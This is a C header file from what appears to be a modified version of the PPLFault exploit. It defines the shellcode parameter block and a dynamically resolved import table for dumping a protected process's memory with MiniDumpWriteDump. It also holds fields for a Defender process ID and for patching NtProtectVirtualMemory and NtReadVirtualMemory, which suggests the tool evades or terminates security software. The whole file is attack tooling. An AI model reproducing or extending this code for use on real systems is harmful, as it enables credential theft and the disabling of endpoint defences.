// Modified PPLFault by Gabriel Landau
// https://twitter.com/GabrielLandau
#pragma once

#include <phnt_windows.h>
#include <phnt.h>
#include <dbghelp.h>

#ifdef __cplusplus
extern "C" {
#endif

typedef struct CallbackHelper
{
    LPVOID dumpBuffer;
    DWORD bytesRead;
} CallbackHelper, * pCallbackHelper;

typedef NTSTATUS (NTAPI * RtlAdjustPrivilege_t)(
    DWORD privilege,
    BOOL bEnablePrivilege,
    BOOL IsThreadPrivilege,
    PDWORD PreviousValue);

typedef HMODULE(WINAPI* LoadLibraryW_t)(
    LPCWSTR lpLibFileName
    );

typedef FARPROC(WINAPI* GetProcAddress_t)(
    HMODULE hModule,
    LPCSTR  lpProcName
    );

typedef HANDLE(WINAPI* OpenProcess_t)(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
    );

typedef HANDLE(WINAPI* CreateFileW_t)(
    LPCWSTR               lpFileName,
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile
    );

typedef BOOL(WINAPI* TerminateProcess_t)(
    HANDLE hProcess,
    UINT   uExitCode
    );

typedef BOOL(WINAPI* MiniDumpWriteDump_t)(
    HANDLE                            hProcess,
    DWORD                             ProcessId,
    HANDLE                            hFile,
    MINIDUMP_TYPE                     DumpType,
    PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
    );

typedef LPVOID(WINAPI* HeapAlloc_t)(
    HANDLE hHeap,
    DWORD dwFlags,
    SIZE_T dwBytes
    );
typedef HANDLE(WINAPI* GetProcessHeap_t)(

    );

typedef BOOL(WINAPI* HeapFree_t)(
    HANDLE hHeap,
    DWORD dwFlags,
    _Frees_ptr_opt_ LPVOID lpMem
    );

typedef BOOL (WINAPI* WriteFile_t)(
    HANDLE       hFile,
    LPCVOID      lpBuffer,
    DWORD        nNumberOfBytesToWrite,
    LPDWORD      lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped
);

typedef BOOL(WINAPI* ReadFile_t) (

    HANDLE hFile,
    LPVOID lpBuffer,
    DWORD nNumberOfBytesToRead,
    LPDWORD lpNumberOfBytesRead,
    LPOVERLAPPED lpOverlapped

);

typedef BOOL(WINAPI* CloseHandle_t)(

    HANDLE hObject

    );

typedef NTSTATUS(NTAPI* NtSuspendProcess_t) (
    HANDLE hProc
    );
typedef NTSTATUS(NTAPI* NtResumeProcess_t) (
    HANDLE hProc
    );
typedef BOOL(WINAPI* VirtualProtect_t) (
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flNewProtect,
    PDWORD lpflOldProtect
    );

typedef BOOL(WINAPI* WriteProcessMemory_t) (
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T* lpNumberOfBytesWritten
    );

typedef HANDLE(WINAPI* GetCurrentProcess_t) (
    );

#define MAGIC1 0x1BADC0D3
#define MAGIC2 0xDEADBEEF

#define MAGIC_NOPS { 0x90, 0x48, 0x87, 0xC9, 0x48, 0x87, 0xD2, 0x4D, 0x87, 0xC0, 0x4D, 0x87, 0xC9, 0x90 }
#define MAGIC_NOPS_LENGTH 14

// 90                      nop
// 48 87 c9                xchg   rcx, rcx
// 48 87 d2                xchg   rdx, rdx
// 4d 87 c0                xchg   r8, r8
// 4d 87 c9                xchg   r9, r9
// 90                      nop

typedef struct _SHELLCODE_PARAMS
{
    DWORD magic1;
    DWORD magic2;

    // User params
    DWORD dwTargetProcessId;
    DWORD dwDefenderPID;
    WCHAR dumpPath[MAX_PATH];

    // Strings (so we don't have to embed them in shellcode)
    CHAR szMiniDumpWriteDump[20]; // "MiniDumpWriteDump"
    WCHAR szDbgHelpDll[12]; // L"Dbghelp.dll"
    CHAR patchNtProtectVirtualMemory[11];
    CHAR patchNtReadVirtualMemory[11];
    

    // IAT
    LoadLibraryW_t pLoadLibraryW;
    GetProcAddress_t pGetProcAddress;
    OpenProcess_t pOpenProcess;
    CreateFileW_t pCreateFileW;
    TerminateProcess_t pTerminateProcess;
    RtlAdjustPrivilege_t pRtlAdjustPrivilege;
    HeapAlloc_t pHeapAlloc;
    HeapFree_t pHeapFree;
    GetProcessHeap_t pGetProcessHeap;
    WriteFile_t pWriteFile;
    ReadFile_t pReadFile;

    CloseHandle_t pCloseHandle;
    NtResumeProcess_t pNtResumeProcess;
    NtSuspendProcess_t pNtSuspendProcess;

    FARPROC pNtProtectVirtualMemory;
    FARPROC pNtReadVirtualMemory;
    VirtualProtect_t pVirtualProtect;
    WriteProcessMemory_t pWriteProcessMemory;
    GetCurrentProcess_t pGetCurrentProcess;

} SHELLCODE_PARAMS, * PSHELLCODE_PARAMS;

typedef BOOL (CALLBACK* minidumpCallback_t)(
    PVOID callbackParam,
    const PMINIDUMP_CALLBACK_INPUT callbackInput,
    PMINIDUMP_CALLBACK_OUTPUT callbackOutput
);

BOOL CALLBACK minidumpCallback(
    PVOID callbackParam,
    const PMINIDUMP_CALLBACK_INPUT callbackInput,
    PMINIDUMP_CALLBACK_OUTPUT callbackOutput
);

#ifdef __cplusplus
} // extern "C"
#endif
